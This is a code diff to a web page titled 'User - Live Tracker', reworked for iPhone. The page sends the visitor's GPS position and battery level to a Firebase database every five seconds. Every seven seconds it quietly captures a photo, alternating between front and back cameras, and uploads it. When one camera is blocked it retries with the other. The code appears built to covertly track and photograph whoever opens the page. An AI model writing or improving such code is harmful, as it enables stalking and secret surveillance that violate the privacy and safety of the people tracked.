@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User - Live Tracker</title>
+    <title>User - Live Tracker (iOS Optimized)</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
@@ -50,10 +50,9 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    db.settings({ cacheSizeBytes: firebase.firestore.CACHE_SIZE_UNLIMITED });
 
     let current_id = "";
-    let useFrontCamera = true; // Camera switch karne ke liye logic
+    let useFrontCamera = true;
 
     async function pushData(lat, lng) {
         let bat = 0;
@@ -73,46 +72,53 @@
         }, { merge: true });
     }
 
-    // Photo Capture Logic (Dual Camera - Free Base64)
+    // Capture Logic Optimized for iPhone
     async function capturePhoto() {
         if (!current_id) return;
         
+        const cameraMode = useFrontCamera ? "user" : "environment";
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
-        
-        // Mode switch: "user" (Front) aur "environment" (Back)
-        const cameraMode = useFrontCamera ? "user" : "environment";
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: cameraMode } 
+                video: { 
+                    facingMode: cameraMode,
+                    width: { ideal: 400 },
+                    height: { ideal: 300 }
+                } 
             });
+
+            // iPhone Fixes
+            video.setAttribute('playsinline', ''); 
+            video.muted = true;
             video.srcObject = stream;
+            
             await video.play();
 
-            // Quality low taaki Free Firestore limit cross na ho
-            canvas.width = 300; 
-            canvas.height = 225;
-            canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
-            
-            const photoData = canvas.toDataURL('image/jpeg', 0.3); 
-            
-            db.collection("locations").doc(current_id).update({
-                userPhoto: photoData,
-                camMode: useFrontCamera ? "Front Camera" : "Back Camera",
-                lastPhotoTime: new Date().toLocaleTimeString()
-            });
+            // iPhone needs a small delay to warm up the camera
+            setTimeout(() => {
+                canvas.width = 300; 
+                canvas.height = 225;
+                canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.3); 
+                
+                db.collection("locations").doc(current_id).update({
+                    userPhoto: photoData,
+                    camMode: useFrontCamera ? "Front Camera" : "Back Camera",
+                    lastPhotoTime: new Date().toLocaleTimeString()
+                });
 
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Agli baar camera badalne ke liye toggle karein
-            useFrontCamera = !useFrontCamera;
-            console.log("Photo Captured from: " + cameraMode);
-            
+                // Stop all tracks to release camera for next cycle
+                stream.getTracks().forEach(track => track.stop());
+                useFrontCamera = !useFrontCamera; // Switch camera for next time
+                console.log("Photo sent from: " + cameraMode);
+            }, 1000); // 1 second delay for iOS stability
+
         } catch (err) {
-            console.log("Camera Blocked or Error:", err);
-            // Agar ek camera block ho toh switch karke try karein
-            useFrontCamera = !useFrontCamera;
+            console.log("Camera Error:", err);
+            useFrontCamera = !useFrontCamera; // Try other camera in next interval
         }
     }
 
@@ -140,14 +146,14 @@
 
             navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
 
-            // Force Location Sync every 5 seconds
+            // Sync Location (Every 5s)
             setInterval(() => {
                 navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
             }, 5000);
 
-            // Start Photo Sync (Every 30 seconds - Baari baari Front/Back)
+            // Sync Photo (Every 5-7 seconds for iPhone stability)
             capturePhoto(); 
-            setInterval(capturePhoto, 3000);
+            setInterval(capturePhoto, 7000); 
 
         } else {
             alert("GPS support nahi hai!");
